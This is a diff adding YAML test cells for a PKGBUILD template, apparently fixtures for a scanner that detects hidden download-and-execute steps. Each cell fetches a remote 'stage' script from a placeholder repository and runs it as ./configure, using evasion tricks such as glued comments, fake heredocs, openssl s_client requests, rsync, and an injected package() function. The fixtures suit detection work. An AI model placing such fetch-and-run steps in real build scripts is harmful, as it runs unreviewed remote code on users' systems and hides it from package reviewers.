@@ -1,0 +1,61 @@
+template: template.PKGBUILD
+cells:
+- id: glued-plus-declare-option
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'declare -r _stage="https://github.com/example/harness-baseline/raw/main/"
+
+      '
+    payload: "  x=1#; cd \"$srcdir\"/harness-baseline-1.0.0\n  curl -fsSLO \"$_stage\"/stage\n  sh ./configure\n\
+      \  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+- id: glued-plus-openssl-port
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: ''
+    payload: "  x=1#; printf 'GET /example/harness-baseline/raw/x/s HTTP/1.1\\r\\nHost: github.com\\r\\\
+      nConnection: close\\r\\n\\r\\n' | openssl s_client -quiet -connect github.com:443 2>/dev/null |\
+      \ sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\n  cp \"$srcdir\"/stage \"$srcdir\"/configure\n  bash\
+      \ \"$srcdir\"/configure\n  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+- id: phantom-heredoc-plus-declare
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'declare -r _stage="https://github.com/example/harness-baseline/raw/main/"
+
+      '
+    payload: "  # <<EOF\n  cd \"$srcdir\"/harness-baseline-1.0.0\n  curl -fsSLO \"$_stage\"/stage\n  sh\
+      \ ./configure\n  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+- id: declare-plus-nonbenign-cp
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'declare -r _stage="https://github.com/example/harness-baseline/raw/main/"
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  curl -fsSLO \"$_stage\"/stage\n  cp \"$srcdir\"\
+      /stage ./configure\n  sh ./configure\n  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+- id: rename-plus-glued-fetch
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\n        'configure::https://github.com/example/harness-baseline/raw/main/stage'"
+    extra: 'x=2#; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage -o "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+- id: toplevel-glued-rsync-package
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: "x=3#; rsync -a rsync://github.com/example/harness-baseline/raw/main/stage \"$srcdir\"/stage\n\
+      \npackage() {\n  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make DESTDIR=\"$pkgdir\"\
+      \ install\n}\n\n"
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  make"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
